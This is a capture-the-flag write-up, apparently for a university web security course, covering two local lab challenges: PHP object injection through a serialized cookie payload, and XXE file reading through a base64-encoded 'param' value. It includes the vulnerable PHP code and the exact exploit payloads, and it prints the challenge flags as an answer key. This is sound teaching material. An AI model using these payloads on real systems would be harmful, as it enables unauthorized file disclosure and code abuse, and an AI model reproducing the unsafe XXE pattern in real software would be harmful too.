# Extended Webapp Security (COMP6843)

## Dependent URLS
* Pastebin Of Source - https://pastebin.com/FEv7c4tA

## Challenges and Flags
| Exploit Type | Level | Flag |
| --- | --- | --- |
| Serialize | 0 | EXTBREAK3{A_c3RiAl_kIlLeR} |
| XXE | 0 | EXTBREAK2{XxE_sHoUlD_b_XeE} |

## PHP unserialize
### Level0
![](break2/img/extbreak2serial0.png)

#### Starting up the Challenge Server
```sh
cd break2/serialize
docker-compose up -d
```

The challenge runs at `http://localhost:8000` and can be shutdown with `docker-compose down`.

#### Writeup / Walkthrough
1. Edit the cookie named `level0`
2. Provision payload that instantiates a `print_flag` object.

By default, the cookie value is set to become the value.

```
s%3A6%3A%22friend%22%3B
```

This is the URL encoded form of the serialised string `s:6:"friend";`

By encoding a serialized object within the `level0` cookie, we exploit `$flagObj = unserialize($_COOKIE['level0']);`, in particular the unserialize function.
In order to get the `__tostring()` function of the `print_flag` object to be run when `echo '<span class="alert-success">' . $flagObj  . '</span>';` is hit, running the `__tostring()` method of `print_flag`.

The following payload will cause the flag to be released.
```
O%3A10%3A%22print_flag%22%3A0%3A%7B%7D
```

This url decodes to `O:10:"print_flag":0:{}`. This payload provides the serialised form of an object according to [PHP Serialize](https://secure.php.net/manual/en/function.serialize.php).

`O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}`

## XML External Entity
### Level0
![](break2/img/extbreak2xxe.png)

#### Successful Payload
`http://0.0.0.0:8001/?param=ZmlsZTovLy9hcHAvZmxhZy50eHQ=`

#### Starting up the Challenge Server
```sh
cd break2/xmlee
docker-compose up -d
```

The challenge runs at `http://localhost:8001` and can be shutdown with `docker-compose down`.

#### Writeup / Walkthrough
1. Look at the source to find that there is extra functionality when supplying the `param` argument. It allows you to select which file to open and display where the default is a file located at `/app/boss/all`.

```php
$myXMLData =
'<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE character [
    <!ELEMENT character ANY >
    <!ELEMENT health ANY >
    <!ELEMENT mana ANY >
    <!ELEMENT class ANY >';

if (isset($_GET['param'])) {
    $myXMLData = $myXMLData . '<!ENTITY param SYSTEM "' . base64_decode($_GET['param']) .  '" > ]>';
} else {
    $myXMLData = $myXMLData . '<!ENTITY param SYSTEM "file:///app/boss/all" > ]>';
}

$myXMLData = $myXMLData . '<character>&param;</character>';
```

2. If you base64 encode the right file, you will trigger the local entity inclusion.

```
echo -n file:///app/boss/health | base64
echo -n file:///app/boss/mana | base64
```

3. The flag can be found by creating the value for the `param` parameter and visiting the url via get.

```sh
echo -n file:///app/flag.txt | base64
ZmlsZTovLy9hcHAvZmxhZy50eHQ=
wget http://0.0.0.0:8001/?param=ZmlsZTovLy9hcHAvZmxhZy50eHQ%3D
```


